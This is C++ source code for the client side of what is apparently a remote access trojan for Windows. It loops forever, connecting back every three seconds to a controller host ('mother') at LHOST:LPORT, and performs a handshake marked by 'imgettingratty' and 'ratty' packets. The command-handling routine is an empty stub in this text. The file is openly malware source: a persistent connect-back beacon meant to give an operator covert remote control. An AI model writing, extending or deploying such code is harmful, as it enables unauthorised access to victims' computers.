#include <rat.hpp>

Rat::Rat(): lhost(LHOST), lport(LPORT) {
    // Before using WinSock you must initialize the API
    // before using any socket related functonality
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return;
    }

    while (true) {
        Ping();
        Listen();
    }

    closesocket(mother);
    WSACleanup(); // cleans up the API
}

RatState Rat::GetState() const {
    return ratState;
}

// when connection isnt established ping the endpoint
void Rat::Ping() {
    while (ratState != RatState::ESTAB) {
        std::cout << "[*] Attempting to create Socket. . ." << std::endl;
        mother = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (mother == INVALID_SOCKET) {
            std::cerr << "[-] Socket creation failed.\n";

            ratState = RatState::PINGING;
            std::this_thread::sleep_for(std::chrono::seconds(3));

            continue;
        }

        sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(lport);
        inet_pton(AF_INET, lhost.c_str(), &serv_addr.sin_addr);

        std::cout << "[*] Attempting to Connect to | " << lhost << ":" << lport << std::endl;

        if (connect(mother, (sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
            std::cerr << "[-] Connection failed.\n";

            ratState = RatState::PINGING;
            closesocket(mother);
            std::this_thread::sleep_for(std::chrono::seconds(3));

            continue;
        }

        // attempt to establish stable connection
        if (EstablishConnection()) {
            ratState = RatState::ESTAB;
        }
    }
    std::cout << "[+] Connected!" << std::endl;
}

// send an initialize packet to inform we are active
bool Rat::EstablishConnection() {
    std::cout << "[*] Attempting to Establish Connection. . ." << std::endl;

    RatPacketUtils::Send(mother, RatPacket("imgettingratty", MsgType::INIT));


    // char buffer[1024] = {0};
    // int bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(mother);

    if (recvPacket.second) {
        std::cout << "[*] Recv Challenge. . ." << std::endl;

        // recv challenge
        // std::string challData = std::string(buffer, bytesReceived);
        // RatPacket challPacket(challData.c_str());
        std::string code = recvPacket.first.GetPacketMessage();

        std::cout << "[*] Replying to Challenge. . ." << std::endl;
        // reply to it
        RatPacketUtils::Send(mother, RatPacket(code, MsgType::INIT));

        // final ack of before possible estab
        char buffer[1024] = {0};
        int bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            std::cout << "[*] Recv Estab Ack. . ." << std::endl;
            std::string ackData = std::string(buffer, bytesReceived);
            RatPacket ackPacket(ackData.c_str());
            return ackPacket.GetPacketMessage() == "ratty";
        }
        return false;
    } else {
        std::cerr << "[-] Initiation Failed!" << std::endl;
        return false;
    }
}

// send non-init packets back to mother
void Rat::Listen() {
    std::cout << "[+] Established with MOTHER!" << std::endl;
}